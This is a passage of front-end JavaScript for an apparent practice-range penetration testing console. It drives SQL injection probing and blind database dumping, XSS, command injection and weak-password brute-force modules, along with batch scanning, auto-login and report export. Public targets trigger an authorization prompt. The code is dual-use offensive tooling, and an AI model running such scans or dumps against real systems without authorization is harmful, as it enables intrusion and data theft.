  async function runFullScan(btn) {
    const targets = {
      sqli: targetOf('sqli'), xss: targetOf('xss'),
      cmdi: targetOf('cmdi'), brute: targetOf('brute'),
    };
    if (!targets.sqli.url && !targets.xss.url && !targets.cmdi.url) {
      toast('请先在 SQL / XSS / 命令注入页填写目标地址', 'warn');
      return;
    }
    const out = $('#fullOut');
    out.innerHTML = '<div class="empty">全流程执行中，进度见下方控制台…</div>';
    try {
      const task = await runTask('/api/fullscan', {
        targets,
        options: {
          params: $('#fullParams').value.trim() || 'id,name,ip',
          brute: !!$('#fullBrute').checked,
        },
      }, { btn, label: '执行中' });
      S.full = task.result || null;
      renderFull(task.result || {});
      $('#fullExport').disabled = !(task.result?.rows || []).length;
      const result = task.result || {};
      toast(`全流程完成：${result.passed}/${result.total} 个模块有发现`, 'ok');
    } catch {
      out.innerHTML = '<div class="empty">执行失败，请查看控制台日志</div>';
    }
  }

  $('#fullRun')?.addEventListener('click', (event) => runFullScan(event.currentTarget));
  $('#heroFullscan')?.addEventListener('click', (event) => {
    $('#fullRun')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    runFullScan(event.currentTarget);
  });

  function renderFull(result) {
    const rows = result.rows || [];
    const out = $('#fullOut');
    if (!rows.length) { out.innerHTML = '<div class="empty">没有结果</div>'; return; }
    const body = rows.map((row) => {
      const [label, cls] = FULL_STATE[row.state] || [row.state, 'chip'];
      return `<tr>
        <td>${esc(row.label)}</td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td>${esc(row.detail_text || '-')}</td>
        <td class="num-cell">${row.elapsed}s</td>
        <td class="num-cell">${row.requests || '-'}</td>
      </tr>`;
    }).join('');
    out.innerHTML = `<div class="inline-out">
        <span class="chip chip-bad">有发现 ${result.passed || 0}</span>
        <span class="chip">共 ${result.total || 0} 个模块</span>
        <span class="chip">参数 ${esc((result.params || []).join(' / '))}</span>
      </div>
      <table><thead><tr><th>模块</th><th>结论</th><th>详情</th><th>耗时</th><th>请求</th></tr></thead>
      <tbody>${body}</tbody></table>`;
  }

  $('#fullExport')?.addEventListener('click', () => {
    const result = S.full;
    if (!result?.rows?.length) { toast('先跑一次全流程', 'warn'); return; }
    let md = reportHead('全流程检测报告', $('#sqliUrl').value.trim());
    md += `## 总览\n\n- 模块：${result.total} 个，有发现 ${result.passed} 个\n`;
    const hasBrute = (result.rows || []).some((row) => row.key === 'brute');
    md += `- 参数：${(result.params || []).join(' / ')}\n- 弱口令：${hasBrute ? '已包含' : '未包含'}\n\n`;
    md += mdTable(['模块', '结论', '详情', '耗时'],
      result.rows.map((row) => [row.label, row.short, row.detail_text, `${row.elapsed}s`])) + '\n\n';

    const byKey = Object.fromEntries(result.rows.map((row) => [row.key, row]));
    const sqli = byKey.sqli?.detail;
    if (sqli?.probe?.vulnerable) {
      const best = sqli.probe.best || {};
      md += `## SQL 注入\n\n`;
      md += mdTable(['参数', '技术', '引号', '注释', '列数', '回显列'],
        [[best.param, best.technique, quoteLabel(best.quote), best.suffix,
          sqli.columns?.columns ?? '-', sqli.display?.display ?? '-']]) + '\n\n';
      if (sqli.fingerprint) {
        md += mdTable(['指纹项', '值'], Object.entries(sqli.fingerprint)
          .filter(([k]) => !['summary', 'severity', 'requests'].includes(k))) + '\n\n';
      }
      if (sqli.databases?.length) {
        md += `数据库：${sqli.databases.map((db) => `\`${db}\``).join('、')}\n\n`;
      }
    }
    const xss = byKey.xss?.detail;
    if (xss?.executable?.length) {
      md += `## XSS\n\n- 判定：${xss.level_text}\n- 可用载荷：${xss.executable.length} 条\n\n`;
      md += mdTable(['载荷', '上下文'], xss.executable.slice(0, 10)
        .map((row) => [`\`${row.payload}\``, row.context_text || '-'])) + '\n\n';
    }
    const cmdi = byKey.cmdi?.detail;
    if (cmdi?.vulnerable) {
      const best = cmdi.best || {};
      md += `## 命令注入\n\n- 参数：${best.param}\n- 连接符：${best.name}\n- whoami：\`${best.whoami || '-'}\`\n\n`;
    }
    const brute = byKey.brute?.detail;
    if (brute?.found?.length) {
      md += `## 弱口令\n\n${mdTable(['用户名', '密码'], brute.found.map((f) => [f.username, f.password]))}\n\n`;
    }
    download('seclab-fullscan.md', md, 'text/markdown');
    toast('全流程报告已生成', 'ok');
  });

  /* ---------------- 批量扫描 ---------------- */
  const BATCH_DEFAULT_PARAM = { sqli: 'id', xss: 'name', cmdi: 'ip' };

  $('#batchModule')?.addEventListener('change', (event) => {
    $('#batchParams').value = BATCH_DEFAULT_PARAM[event.target.value] || 'id';
  });

  $('#batchFromModule')?.addEventListener('click', () => {
    const module = $('#batchModule').value;
    const target = targetOf(module);
    $('#batchCookie').value = target.cookie || '';
    $('#batchParams').value = BATCH_DEFAULT_PARAM[module] || 'id';
    $('#batchDelay').value = target.delay || 0.05;
    const box = $('#batchUrls');
    if (target.url && !box.value.includes(target.url)) {
      box.value = [target.url, box.value].filter(Boolean).join('\n');
    }
    toast('已从模块页复制配置', 'ok');
  });

  $('#batchRun')?.addEventListener('click', async (event) => {
    const urls = $('#batchUrls').value.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
    if (!urls.length) { toast('请先粘贴目标地址，每行一个', 'warn'); return; }
    if (urls.length > 20) { toast('最多 20 个目标，已自动截断', 'warn'); }
    const out = $('#batchOut');
    out.innerHTML = '<div class="empty">批量扫描中，进度见下方控制台…</div>';
    try {
      const task = await runTask('/api/batch', {
        module: $('#batchModule').value,
        params: $('#batchParams').value.trim(),
        cookie: $('#batchCookie').value.trim(),
        delay: parseFloat($('#batchDelay').value) || 0.05,
        urls,
      }, { btn: event.currentTarget, label: '扫描中' });
      S.batch = task.result || null;
      renderBatch(task.result || {});
      $('#batchExport').disabled = !(task.result?.rows || []).length;
      toast(`批量完成：${task.result?.passed}/${task.result?.total} 个可用`, 'ok');
    } catch {
      out.innerHTML = '<div class="empty">批量扫描失败，请查看控制台日志</div>';
    }
  });

  const BATCH_STATE = { ok: ['可用', 'chip-ok'], warn: ['部分', 'chip-warn'], fail: ['不可用', 'chip-bad'] };

  function renderBatch(result) {
    const rows = result.rows || [];
    const out = $('#batchOut');
    if (!rows.length) { out.innerHTML = '<div class="empty">没有结果</div>'; return; }
    const body = rows.map((row, index) => {
      const [label, cls] = BATCH_STATE[row.state] || [row.state, 'chip'];
      return `<tr>
        <td class="num-cell">${index + 1}</td>
        <td class="mono" title="${esc(row.target)}">${esc(String(row.target || '').slice(0, 62))}</td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td>${esc(row.short || '')}</td>
        <td class="mono">${row.param || '-'}</td>
        <td class="num-cell">${row.elapsed}s</td>
        <td><button class="btn btn-sm" data-load="${esc(row.target)}" data-module="${esc(result.module)}">载入</button></td>
      </tr>`;
    }).join('');
    out.innerHTML = `<div class="inline-out">
        <span class="chip chip-ok">可用 ${result.passed || 0}</span>
        <span class="chip chip-bad">失败 ${result.failed || 0}</span>
        <span class="chip">参数 ${esc(result.param || '-')}</span>
      </div>
      <table><thead><tr><th class="num">#</th><th>目标</th><th>状态</th><th>结论</th><th>参数</th><th>耗时</th><th></th></tr></thead>
      <tbody>${body}</tbody></table>`;
    $$('[data-load]', out).forEach((btn) => btn.addEventListener('click', () => {
      const module = btn.dataset.module;
      const url = btn.dataset.load;
      const input = $(`#${module}Url`);
      if (input) {
        input.value = url;
        localStorage.setItem(`seclab.${module}.url`, url);
      }
      go(module);
      toast(`已把目标载入 ${PAGE_NAME[module]}`, 'ok');
    }));
  }

  $('#batchExport')?.addEventListener('click', () => {
    const result = S.batch;
    if (!result?.rows?.length) { toast('先跑一次批量扫描', 'warn'); return; }
    let md = reportHead(`批量扫描报告 · ${result.module.toUpperCase()}`,
      `${result.total} 个目标 / 参数 ${result.param}`);
    md += `## 概览\n\n- 可用：${result.passed}\n- 失败：${result.failed}\n\n`;
    md += mdTable(['#', '目标', '状态', '结论', '耗时'],
      result.rows.map((row, index) => [index + 1, row.target,
        row.state === 'ok' ? '可用' : row.state === 'warn' ? '部分' : '不可用',
        row.short || row.detail || '-', `${row.elapsed}s`])) + '\n\n';
    download('seclab-batch.md', md, 'text/markdown');
    toast('批量扫描报告已导出', 'ok');
  });

  /* ---------------- settings / proxy / stop ---------------- */
  function refreshProxyPill() {
    const proxy = localStorage.getItem('seclab.global.proxy') || '';
    const pill = $('#openSettings');
    if (!pill) return;
    $('#proxyState').textContent = proxy ? 'PROXY' : '直连';
    pill.classList.toggle('on', !!proxy);
    pill.title = proxy ? `已启用代理：${proxy}` : '未配置代理，点击设置';
  }

  function closeSettings() {
    const modal = $('#settingsModal');
    if (modal) modal.hidden = true;
  }

  $('#openSettings')?.addEventListener('click', () => {
    $('#setProxy').value = localStorage.getItem('seclab.global.proxy') || '';
    $('#setUA').value = localStorage.getItem('seclab.global.ua') || '';
    $('#settingsModal').hidden = false;
    $('#setProxy').focus();
  });
  $('#closeSettings')?.addEventListener('click', closeSettings);

  function applyCookieAll(cookie) {
    ['sqli', 'xss', 'cmdi', 'brute'].forEach((prefix) => {
      const input = $(`#${prefix}Cookie`);
      if (input) {
        input.value = cookie;
        localStorage.setItem(`seclab.${prefix}.cookie`, cookie);
      }
    });
  }

  const AUTH = { user: '', pass: '', lastCheck: 0, dismissed: false };

  function showAuthBanner(msg) {
    const el = $('#authBanner');
    if (!el || AUTH.dismissed) return;
    if (msg) $('#authMsg').textContent = msg;
    el.hidden = false;
  }

  function hideAuthBanner() {
    const el = $('#authBanner');
    if (el) el.hidden = true;
  }

  async function checkSession(force = false) {
    if (AUTH.dismissed) return;
    if (!force && Date.now() - AUTH.lastCheck < 60000) return;
    const target = targetOf('sqli');
    if (!target.url) return;
    AUTH.lastCheck = Date.now();
    try {
      const res = await api('/api/target/check', { target });
      if (res.login_required) showAuthBanner();
      else hideAuthBanner();
    } catch { /* 网络问题不打扰 */ }
  }

  async function performLogin(btn, creds) {
    const out = $('#loginOut');
    if (out) out.innerHTML = '<span class="chip">登录中…</span>';
    const task = await runTask('/api/auth/login', creds, { btn, label: '登录中' });
    const result = task.result || {};
    if (!result.cookie) throw new Error('登录成功但没有返回 Cookie');
    applyCookieAll(result.cookie);
    AUTH.user = creds.username;
    AUTH.pass = creds.password;
    AUTH.lastCheck = Date.now();
    AUTH.dismissed = false;
    hideAuthBanner();
    if (out) {
      out.innerHTML = `<span class="chip chip-ok">登录成功</span>
        <span class="chip">${esc(result.username)}</span>
        <span class="chip">${esc((result.cookies || []).join(' / '))}</span>
        <span class="chip">security=${esc(result.security || '-')}</span>`;
    }
    return result;
  }

  function defaultLoginUrl() {
    const raw = targetOf('sqli').url || $('#loginUrl').value.trim();
    try {
      const url = new URL(raw);
      return `${url.origin}/login.php`;
    } catch {
      return $('#loginUrl').value.trim();
    }
  }

  $('#doLogin')?.addEventListener('click', async (event) => {
    const loginUrl = $('#loginUrl').value.trim();
    const username = $('#loginUser').value.trim();
    const password = $('#loginPass').value;
    if (!loginUrl) { toast('请填写登录页地址', 'warn'); return; }
    if (!username) { toast('请填写靶场用户名', 'warn'); return; }
    try {
      const result = await performLogin(event.currentTarget, {
        login_url: loginUrl, username, password, security: $('#secLevel').value,
      });
      toast('已登录并同步 Cookie 到四个模块', 'ok');
      logConsole('sys', `自动登录成功：${result.username}，Cookie 已写入四个模块`);
    } catch (err) {
      const out = $('#loginOut');
      out.innerHTML = `<span class="chip chip-bad">登录失败</span>
        <span class="hint">${esc(err.message)}</span>`;
    }
  });

  $('#authRelogin')?.addEventListener('click', async (event) => {
    if (!AUTH.user || !AUTH.pass) {
      $('#settingsModal').hidden = false;
      $('#loginUser').focus();
      toast('先在设置里填账号密码并登录一次，之后就能一键重登', 'warn');
      return;
    }
    try {
      await performLogin(event.currentTarget, {
        login_url: defaultLoginUrl(),
        username: AUTH.user,
        password: AUTH.pass,
        security: $('#secLevel').value,
      });
      toast('已重新登录，Cookie 已刷新', 'ok');
      logConsole('sys', 'Cookie 失效检测 → 已自动重新登录并同步');
    } catch (err) {
      toast(err.message, 'err');
    }
  });

  $('#authDismiss')?.addEventListener('click', () => {
    AUTH.dismissed = true;
    hideAuthBanner();
  });

  /* ---------------- 目标配置档 ---------------- */
  const PROFILE_KEY = 'seclab.profiles';

  function readProfiles() {
    try {
      const list = JSON.parse(localStorage.getItem(PROFILE_KEY) || '[]');
      return Array.isArray(list) ? list : [];
    } catch { return []; }
  }

  function writeProfiles(list) {
    localStorage.setItem(PROFILE_KEY, JSON.stringify(list.slice(0, 30)));
    renderProfiles();
  }

  function snapshotConfig() {
    const modules = {};
    ['sqli', 'xss', 'cmdi', 'brute'].forEach((prefix) => {
      const item = {};
      $$(`[data-prefix="${prefix}"]`).forEach((el) => {
        item[el.dataset.key] = el.type === 'checkbox' ? el.checked : el.value;
      });
      modules[prefix] = item;
    });
    return { security: $('#secLevel').value, modules, savedAt: Date.now() };
  }

  function applyConfig(cfg) {
    Object.entries(cfg.modules || {}).forEach(([prefix, item]) => {
      $$(`[data-prefix="${prefix}"]`).forEach((el) => {
        const value = item[el.dataset.key];
        if (value === undefined) return;
        if (el.type === 'checkbox') {
          el.checked = !!value;
          localStorage.setItem(`seclab.${prefix}.${el.dataset.key}`, el.checked ? '1' : '0');
        } else {
          el.value = value;
          el.dispatchEvent(new Event('input', { bubbles: true }));
        }
      });
    });
    if (cfg.security) {
      $('#secLevel').value = cfg.security;
      applySecurity(cfg.security);
    }
  }

  function renderProfiles(selectedId) {
    const list = readProfiles();
    const box = $('#profileList');
    if (!box) return;
    if (!list.length) {
      box.innerHTML = '<option value="">（暂无保存的配置）</option>';
      return;
    }
    box.innerHTML = list.map((item) => {
      const when = new Date(item.savedAt || Date.now()).toLocaleDateString('zh-CN');
      return `<option value="${item.id}">${esc(item.name)} · ${when}</option>`;
    }).join('');
    if (selectedId) box.value = selectedId;
  }

  $('#profileSave')?.addEventListener('click', () => {
    const name = $('#profileName').value.trim()
      || `配置 ${new Date().toLocaleString('zh-CN', { hour12: false })}`;
    const list = readProfiles();
    const item = { id: `p${Date.now().toString(36)}`, name, ...snapshotConfig() };
    list.unshift(item);
    writeProfiles(list);
    $('#profileName').value = '';
    renderProfiles(item.id);
    toast(`已保存配置「${name}」`, 'ok');
  });

  $('#profileApply')?.addEventListener('click', () => {
    const id = $('#profileList').value;
    if (!id) { toast('没有可应用的配置', 'warn'); return; }
    const item = readProfiles().find((p) => p.id === id);
    if (!item) { toast('配置不存在', 'err'); return; }
    applyConfig(item);
    closeSettings();
    loadDefaults();
    toast(`已应用配置「${item.name}」`, 'ok');
  });

  $('#profileDelete')?.addEventListener('click', () => {
    const id = $('#profileList').value;
    if (!id) return;
    const item = readProfiles().find((p) => p.id === id);
    if (!item || !window.confirm(`删除配置「${item.name}」？`)) return;
    writeProfiles(readProfiles().filter((p) => p.id !== id));
    toast('配置已删除', 'ok');
  });

  $('#profileExport')?.addEventListener('click', () => {
    const list = readProfiles();
    if (!list.length) { toast('还没有保存的配置', 'warn'); return; }
    download('seclab-profiles.json', JSON.stringify(list, null, 2), 'application/json');
    toast(`已导出 ${list.length} 个配置`, 'ok');
  });

  $('#profileImport')?.addEventListener('click', () => $('#profileFile').click());
  $('#profileFile')?.addEventListener('change', async (event) => {
    const file = event.target.files?.[0];
    if (!file) return;
    try {
      const text = await file.text();
      const data = JSON.parse(text);
      const list = Array.isArray(data) ? data : [data];
      const clean = list.filter((item) => item && item.modules).map((item) => ({
        ...item,
        id: item.id || `p${Math.random().toString(36).slice(2, 9)}`,
        name: item.name || '导入配置',
      }));
      if (!clean.length) throw new Error('文件里没有可用的配置');
      const merged = [...clean, ...readProfiles()].slice(0, 30);
      writeProfiles(merged);
      renderProfiles(clean[0].id);
      toast(`已导入 ${clean.length} 个配置`, 'ok');
    } catch (err) {
      toast(`导入失败：${err.message}`, 'err');
    } finally {
      event.target.value = '';
    }
  });

  /* ---------------- 公网授权确认 ---------------- */
  const AUTH_NOTICE_KEY = 'seclab.authNotice';

  $$('[data-key="public"]').forEach((box) => box.addEventListener('change', () => {
    if (!box.checked) return;
    const prefix = box.dataset.prefix;
    let host = '';
    try { host = new URL($(`#${prefix}Url`)?.value || '').hostname; } catch { host = ''; }
    const agreed = window.confirm(
      `确认授权\n\n即将测试公网目标：${host || '(未填写地址)'}\n\n` +
      '请确认：\n'
      + '· 该资产属于你本人，或你已获得书面授权；\n'
      + '· 测试范围与时间窗已经明确。\n\n'
      + '未经授权扫描他人系统，可能违反《网络安全法》与《刑法》第 285 条。\n\n'
      + '确认后本次授权记录会写进导出的报告。');
    if (!agreed) {
      box.checked = false;
      localStorage.setItem(`seclab.${prefix}.public`, '0');
      toast('已取消「授权公网目标」', 'warn');
      return;
    }
    localStorage.setItem(AUTH_NOTICE_KEY,
      JSON.stringify({ host, ts: Date.now(), prefix }));
    toast(`已记录授权：${host || '公网目标'}`, 'ok');
  }));
  $('#settingsModal')?.addEventListener('click', (event) => {
    if (event.target.id === 'settingsModal') closeSettings();
  });
  document.addEventListener('keydown', (event) => {
    if (event.key === 'Escape') {
      closeSettings();
      const detail = $('#detailModal');
      if (detail) detail.hidden = true;
    }
  });
  $('#saveSettings')?.addEventListener('click', () => {
    const proxy = $('#setProxy').value.trim();
    const ua = $('#setUA').value.trim();
    if (proxy) localStorage.setItem('seclab.global.proxy', proxy);
    else localStorage.removeItem('seclab.global.proxy');
    if (ua) localStorage.setItem('seclab.global.ua', ua);
    else localStorage.removeItem('seclab.global.ua');
    refreshProxyPill();
    closeSettings();
    toast(proxy ? '代理已生效，后续请求将走该代理' : '已切换为直连', 'ok');
    logConsole('sys', proxy ? `HTTP 代理已启用：${proxy}` : 'HTTP 代理已关闭');
  });
  $('#resetSettings')?.addEventListener('click', () => {
    localStorage.removeItem('seclab.global.proxy');
    localStorage.removeItem('seclab.global.ua');
    $('#setProxy').value = '';
    $('#setUA').value = '';
    refreshProxyPill();
    toast('已清空代理与 UA', 'ok');
  });

  $('#consoleStop')?.addEventListener('click', async () => {
    if (!state.running) return;
    try {
      await api(`/api/task/${state.running}/stop`, {});
      toast('已发送中止指令', 'warn');
    } catch (err) {
      toast(err.message, 'err');
    }
  });

  /* ---------------- security level ---------------- */
  const SECURITY_LEVELS = ['low', 'medium', 'high'];

  function currentSecurity() {
    const cookie = $('#sqliCookie')?.value || '';
    const match = cookie.match(/security\s*=\s*(\w+)/i);
    return match && SECURITY_LEVELS.includes(match[1].toLowerCase())
      ? match[1].toLowerCase() : 'low';
  }

  function applySecurity(level) {
    if (!SECURITY_LEVELS.includes(level)) level = 'low';
    ['sqli', 'xss', 'cmdi', 'brute'].forEach((prefix) => {
      const input = $(`#${prefix}Cookie`);
      if (!input) return;
      let value = input.value.trim();
      if (/security\s*=/i.test(value)) {
        value = value.replace(/security\s*=\s*[^;\s]*/ig, `security=${level}`);
      } else if (value) {
        value = `${value.replace(/;\s*$/, '')}; security=${level}`;
      } else {
        value = `security=${level}`;
      }
      input.value = value;
      localStorage.setItem(`seclab.${prefix}.cookie`, value);
    });
    localStorage.setItem('seclab.security', level);
  }

  $('#secLevel')?.addEventListener('change', (event) => {
    const level = event.target.value;
    applySecurity(level);
    logConsole('sys', `靶场安全级别已切换为 ${level.toUpperCase()}`);
    if (level === 'high') {
      toast('已切换 HIGH：SQLi 走 session-input，命令注入 / XSS 可能被靶场彻底阻断', 'warn');
    } else if (level === 'medium') {
      toast('已切换 MEDIUM：SQLi 改 POST、爆破失败会 sleep 2 秒', 'warn');
    } else {
      toast('已切换 LOW', 'ok');
    }
  });

  /* ---------------- SQLi blind ---------------- */
  let blindMode = 'boolean';
  $$('#sqliBlindMode .seg-btn').forEach((btn) => btn.addEventListener('click', () => {
    blindMode = btn.dataset.mode;
    $$('#sqliBlindMode .seg-btn').forEach((el) => el.classList.toggle('active', el === btn));
    $('#sqliBlindDelayWrap').hidden = blindMode !== 'time';
    if (blindMode === 'time') toast('时间盲注每字符约 1 秒，建议最多 8 个字符', 'warn');
  }));

  $('#sqliBlindRun')?.addEventListener('click', async (event) => {
    if (!S.ctx) { toast('请先探测注入点，建立上下文', 'warn'); return; }
    const expr = $('#sqliBlindExpr').value.trim();
    if (!expr) { toast('请输入要提取的 SQL 表达式', 'warn'); return; }
    const maxLen = parseInt($('#sqliBlindLen').value, 10) || 24;
    try {
      const task = await runTask('/api/sqli/blind', {
        target: targetOf('sqli'), inject: S.ctx, expr, max_len: maxLen,
        mode: blindMode,
        delay: parseFloat($('#sqliBlindDelay').value) || 1,
      }, { btn: event.currentTarget, label: '盲注中' });
      const result = task.result || {};
      $('#sqliBlindOut').innerHTML = `
        <span class="chip chip-ok">RESULT</span>
        <span class="chip chip-cyan">${result.mode === 'time' ? '时间' : '布尔'}</span>
        <span class="chip">${result.requests || 0} 次请求</span>
        ${result.truncated ? '<span class="chip chip-warn">已截断</span>' : ''}
        <pre>${esc(result.value)}</pre>`;
      toast('盲注提取完成', 'ok');
    } catch { /* handled */ }
  });

  $('#sqliBlindDumpBtn')?.addEventListener('click', async (event) => {
    if (!S.ctx) { toast('请先探测注入点，建立上下文', 'warn'); return; }
    const database = $('#sqliBlindDb').value.trim();
    if (!database) { toast('请填写数据库名', 'warn'); return; }
    const table = $('#sqliBlindTable').value.trim();
    if (blindMode === 'time' && !table) {
      toast('时间盲注下整库枚举会非常慢，请先指定表名', 'warn');
      return;
    }
    const out = $('#sqliBlindDumpOut');
    out.innerHTML = '<div class="empty">盲注拖库中，进度见下方控制台…</div>';
    try {
      const task = await runTask('/api/sqli/blind_dump', {
        target: targetOf('sqli'), inject: S.ctx,
        database, table,
        columns: $('#sqliBlindCols').value.trim(),
        rows: parseInt($('#sqliBlindRows').value, 10) || 3,
        mode: blindMode,
        delay: parseFloat($('#sqliBlindDelay').value) || 1,
      }, { btn: event.currentTarget, label: '拖库中' });
      S.blindDump = task.result || null;
      renderBlindDump(task.result || {});
      const rows = (task.result?.rows || []).length
        || (task.result?.tables || []).reduce((sum, item) => sum + item.rows.length, 0);
      toast(`盲注拖库完成：${rows} 行`, 'ok');
    } catch {
      out.innerHTML = '<div class="empty">拖库失败，请查看控制台日志</div>';
    }
  });

  function renderBlindDump(result) {
    const out = $('#sqliBlindDumpOut');
    if (result.tables) {
      if (!result.tables.length) { out.innerHTML = '<div class="empty">没有取到任何表</div>'; return; }
      const body = result.tables.map((item) => `<tr>
        <td class="mono">${esc(item.table)}</td>
        <td class="mono">${esc((item.columns || []).join(', '))}</td>
        <td class="num-cell">${item.rows.length}</td>
        <td class="num-cell">${item.total_rows ?? '-'}</td>
      </tr>`).join('');
      out.innerHTML = `<div class="inline-out"><span class="chip chip-ok">整库盲注</span>
        <span class="chip">${result.requests || 0} 次请求</span>
        <span class="chip">${result.total_rows || 0} 行</span></div>
        <table><thead><tr><th>数据表</th><th>字段</th><th>行数</th><th>总行</th></tr></thead>
        <tbody>${body}</tbody></table>`;
      return;
    }
    const columns = result.columns || [];
    const rows = result.rows || [];
    if (!rows.length) { out.innerHTML = '<div class="empty">没有取到数据</div>'; return; }
    const head = columns.map((col) => `<th>${esc(col)}</th>`).join('');
    const body = rows.map((row, index) => `<tr>
      <td class="num-cell">${index + 1}</td>
      ${columns.map((col) => `<td class="mono" title="${esc(row[col] ?? '')}">${esc(String(row[col] ?? '').slice(0, 120))}</td>`).join('')}
    </tr>`).join('');
    out.innerHTML = `<div class="inline-out"><span class="chip chip-ok">盲注导出</span>
      <span class="chip">${result.database}.${result.table}</span>
      <span class="chip">${result.requests || 0} 次请求</span></div>
      <table><thead><tr><th class="num">#</th>${head}</tr></thead><tbody>${body}</tbody></table>`;
  }

  /* ---------------- reports ---------------- */
  const quoteLabel = (quote) => ({ "'": '单引号', '"': '双引号', '': '数字型' }[quote] ?? quote);

  function mdCell(value) {
    return String(value ?? '').replace(/\|/g, '\\|').replace(/\r?\n/g, '<br>');
  }

  function mdTable(headers, rows) {
    const head = `| ${headers.join(' | ')} |`;
    const line = `| ${headers.map(() => '---').join(' | ')} |`;
    const body = rows.map((row) => `| ${row.map(mdCell).join(' | ')} |`);
    return [head, line, ...body].join('\n');
  }

  function reportHead(title, target) {
    return `# ${title}\n\n- 时间：${new Date().toLocaleString('zh-CN', { hour12: false })}\n- 目标：${target}\n${authNoticeLine(target)}- 工具：SecLab Console v12\n- 说明：仅用于授权靶场验证\n\n`;
  }

  function isPrivateTarget(target) {
    let host = '';
    try { host = new URL(target).hostname; } catch { return true; }
    if (!host) return true;
    return /^(localhost|127\.|10\.|192\.168\.|169\.254\.)/.test(host)
      || /^172\.(1[6-9]|2\d|3[01])\./.test(host)
      || /\.(local|lab|test|internal|localhost)$/i.test(host);
  }

  function authNoticeLine(target) {
    if (isPrivateTarget(target)) return '';
    let notice = null;
    try { notice = JSON.parse(localStorage.getItem('seclab.authNotice') || 'null'); } catch { notice = null; }
    if (!notice?.ts) {
      return '- 授权状态：⚠️ 公网目标，未记录授权确认\n';
    }
    const when = new Date(notice.ts).toLocaleString('zh-CN', { hour12: false });
    return `- 授权确认：${notice.host || '公网目标'}（${when}，由操作者确认）\n`;
  }

  $('#sqliReport')?.addEventListener('click', () => {
    if (!S.ctx && !S.probe) { toast('先完成一次 SQL 探测', 'warn'); return; }
    let md = reportHead('SQL 注入测试报告', $('#sqliUrl').value.trim());
    if (S.ctx) {
      md += `## 注入上下文\n\n${mdTable(['参数', '引号', '注释', '列数', '回显列'],
        [[S.ctx.param, quoteLabel(S.ctx.quote), S.ctx.suffix, S.ctx.columns || '-', S.ctx.display || '-']])}\n\n`;
    }
    if (S.probe?.findings?.length) {
      md += `## 探测证据\n\n${mdTable(['技术', '参数', 'Payload', '证据'],
        S.probe.findings.map((f) => [TECH_LABEL[f.technique] || f.technique, f.param,
          `\`${f.payload}\``, JSON.stringify(f.evidence)]))}\n\n`;
    }
    if (S.fingerprint) {
      md += `## 数据库指纹\n\n${mdTable(['项', '值'], Object.entries(S.fingerprint)
        .filter(([k]) => k !== 'summary' && k !== 'severity'))}\n\n`;
    }
    if (S.dbs?.length) {
      md += `## 数据库列表\n\n${S.dbs.map((db) => `- ${db}`).join('\n')}\n\n`;
    }
    if (S.rows?.rows?.length) {
      md += `## 数据导出：${S.rows.database}.${S.rows.table}\n\n`;
      md += mdTable(S.rows.columns, S.rows.rows.map((row) => S.rows.columns.map((col) => row[col]))) + '\n\n';
    }
    if (S.dumpAll?.tables?.length) {
      md += `## 整库导出：${S.dumpAll.database}\n\n`;
      md += mdTable(['数据表', '导出行数', '总行数'],
        S.dumpAll.tables.map((item) => [item.table, item.rows.length, item.total_rows ?? '-'])) + '\n\n';
    }
    if (S.blindDump) {
      const bd = S.blindDump;
      md += `## 盲注拖库（无回显）\n\n- 数据库：${bd.database}\n- 请求数：${bd.requests || '-'}\n\n`;
      if (bd.tables?.length) {
        md += mdTable(['数据表', '字段', '导出行数'],
          bd.tables.map((item) => [item.table, (item.columns || []).join(', '), item.rows.length])) + '\n\n';
      } else if (bd.rows?.length) {
        md += `### ${bd.database}.${bd.table}\n\n`;
        md += mdTable(bd.columns || [], bd.rows.map((row) => (bd.columns || []).map((col) => row[col]))) + '\n\n';
      }
    }
    download('sqli-report.md', md, 'text/markdown');
    toast('SQL 注入报告已生成', 'ok');
  });

  $('#xssReport')?.addEventListener('click', () => {
    const result = X.result;
    if (!result) { toast('先完成一次 XSS 检测', 'warn'); return; }
    let md = reportHead('XSS 测试报告', $('#xssUrl').value.trim());
    md += `## 判定\n\n- 模式：${result.mode === 'stored' ? '存储型' : '反射型'}\n`;
    md += `- 等级：${result.level_text}\n- 可用载荷：${(result.executable || []).length}\n`;
    if (result.stored_count !== undefined) md += `- 成功持久化：${result.stored_count}\n`;
    md += '\n';
    md += `## 载荷矩阵\n\n${mdTable(['载荷', '反射', '上下文', '可执行'],
      (result.results || []).map((row) => [row.payload,
        (REFLECT_LABEL[row.reflection] || ['未知'])[0], row.context_text || '-',
        (row.reflection === 'raw' && ['html', 'attribute', 'tag', 'comment'].includes(row.context)) ? '是' : '否']))}\n\n`;
    if (X.poc?.links?.length) {
      md += `## POC 链路\n\n${X.poc.links.map((link) => `- ${link}`).join('\n')}\n\n`;
    }
    download('xss-report.md', md, 'text/markdown');
    toast('XSS 报告已生成', 'ok');
  });

  $('#cmdiReport')?.addEventListener('click', () => {
    const result = state.cmdi.result;
    if (!result?.vulnerable) { toast('先完成一次命令注入检测', 'warn'); return; }
    let md = reportHead('命令注入测试报告', $('#cmdiUrl').value.trim());
    md += `## 可用注入点\n\n${mdTable(['参数', '连接方式', '系统', 'whoami'],
      (result.findings || []).map((item) => [item.param, item.name, item.os, item.whoami || '-']))}\n\n`;
    if (state.cmdi.lastOutput) {
      md += `## 最近一次命令输出\n\n\`\`\`\n${state.cmdi.lastOutput}\n\`\`\`\n\n`;
    }
    download('cmdi-report.md', md, 'text/markdown');
    toast('命令注入报告已生成', 'ok');
  });

  $('#bruteReport')?.addEventListener('click', () => {
    if (!state.brute.found.length) { toast('还没有命中结果', 'warn'); return; }
    let md = reportHead('弱口令测试报告', state.brute.target || $('#bruteUrl').value.trim());
    md += `## 命中凭证（${state.brute.found.length} 组）\n\n`;
    md += mdTable(['用户名', '密码', '状态码'], state.brute.found.map((item) => [item.username, item.password, item.status]));
    download('brute-report.md', md, 'text/markdown');
    toast('弱口令报告已生成', 'ok');
  });

  /* ---------------- XSS mode / stored ---------------- */
  function storedMarkdown(result) {
    let md = `# 存储型 XSS POC\n\n- 目标：${$('#xssSubmitUrl').value.trim()}\n- 时间：${new Date().toLocaleString('zh-CN', { hour12: false })}\n\n`;
    md += `## 结果\n\n- 等级：${result.level_text}\n- 持久化：${result.stored_count}\n\n## 可用载荷\n\n`;
    (result.executable || []).forEach((row) => { md += `- \`${row.payload}\`\n`; });
    return md;
  }

  async function xssStoredScan(btn) {
